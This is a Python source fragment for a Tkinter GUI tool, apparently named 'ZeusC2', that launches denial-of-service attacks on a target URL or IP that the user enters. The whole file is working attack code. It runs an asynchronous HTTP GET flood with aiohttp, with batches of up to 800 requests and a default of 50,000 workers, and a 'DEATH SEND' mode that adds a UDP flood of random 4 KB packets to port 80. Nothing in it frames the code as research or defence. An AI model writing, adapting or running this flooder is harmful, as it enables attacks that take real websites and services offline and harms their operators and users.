    def log(self, text):
        ts = time.strftime("%H:%M:%S")
        self.log_area.insert(tk.END, f"[{ts}] {text}\n")
        self.log_area.see(tk.END)

    def start_attack(self):
        if self.attack_running:
            messagebox.showinfo("Info", "Attack already running!")
            return

        target = self.url_entry.get().strip() or self.ip_entry.get().strip()
        if not target:
            messagebox.showwarning("Warning", "Voer een target in!")
            return

        try:
            duration = int(self.duration_entry.get())
            workers = int(self.workers_entry.get())
        except:
            duration = 30
            workers = 50000

        mode = "DEATH SEND" if self.death_var.get() else "FULL"

        self.attack_running = True
        self.start_btn.config(state=tk.DISABLED, text="ATTACK RUNNING...")

        self.log(f"Starting {mode} on {target} | Duration: {duration}s | Workers: {workers:,}")

        self.open_command_window(target, duration, workers, mode)

    def open_command_window(self, target, duration, workers, mode):
        cmd_win = tk.Toplevel(self.root)
        cmd_win.title("Command@ZeusC2")
        cmd_win.geometry("780x520")
        cmd_win.configure(bg=BG_COLOR)

        tk.Label(cmd_win, text="[Command@ZeusC2] >", font=("Consolas", 11), fg=CYAN, bg=BG_COLOR).pack(anchor="w", padx=20, pady=10)

        self.cmd_log = tk.Text(cmd_win, bg="#000000", fg=GREEN, font=("Consolas", 10))
        self.cmd_log.pack(fill=tk.BOTH, expand=True, padx=20, pady=10)

        def cmd_log(msg):
            ts = time.strftime("%H:%M:%S")
            self.cmd_log.insert(tk.END, f"[{ts}] {msg}\n")
            self.cmd_log.see(tk.END)

        cmd_log(f"Target: {target}")
        cmd_log(f"Mode: {mode} | Workers: {workers:,}")
        cmd_log("Launching threads...")

        threading.Thread(target=self.run_attack, args=(target, duration, workers, mode, cmd_log), daemon=True).start()

    def run_attack(self, target, duration, workers, mode, log_func):
        try:
            if mode == "DEATH SEND":
                threading.Thread(target=self.udp_flood, args=(target, duration, log_func), daemon=True).start()
            asyncio.run(self.http_attack(target, duration, workers, mode, log_func))
        except Exception as e:
            log_func(f"Error: {e}")
        finally:
            self.root.after(0, self.attack_finished)

    async def http_attack(self, target, duration, workers, mode, log_func):
        connector = aiohttp.TCPConnector(limit=0, ssl=False)
        timeout = aiohttp.ClientTimeout(total=15)

        async with aiohttp.ClientSession(connector=connector, timeout=timeout) as session:
            end_time = time.time() + duration
            count = 0

            while time.time() < end_time and self.attack_running:
                tasks = []
                batch = min(300, workers) if mode != "DEATH SEND" else min(800, workers)

                for _ in range(batch):
                    tasks.append(self.send_request(session, target))
                    count += 1

                await asyncio.gather(*tasks, return_exceptions=True)

                if count % 5000 == 0:
                    log_func(f"Requests sent: {count:,}")

                await asyncio.sleep(0.001 if mode == "DEATH SEND" else 0.02)

        log_func("HTTP Attack finished.")

    async def send_request(self, session, target):
        try:
            async with session.get(f"http://{target}", allow_redirects=False) as resp:
                await resp.read()
        except:
            pass

    def udp_flood(self, target, duration, log_func):
        try:
            sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
            sock.setsockopt(socket.SOL_SOCKET, socket.SO_SNDBUF, 65536 * 8)
            packet = random.randbytes(4096)
            end_time = time.time() + duration
            count = 0
            while time.time() < end_time and self.attack_running:
                try:
                    sock.sendto(packet, (target, 80))
                    count += 1
                    if count % 10000 == 0:
                        log_func(f"UDP Packets sent: {count:,}")
                except:
                    pass
                time.sleep(0.0001)
        except Exception as e:
            log_func(f"UDP Error: {e}")

    def attack_finished(self):
        self.attack_running = False
        self.start_btn.config(state=tk.NORMAL, text="ūüöÄ START ATTACK ūüöÄ")
        self.status_label.config(text="‚úď Operation completed", fg=CYAN)
        self.log("Attack finished.")

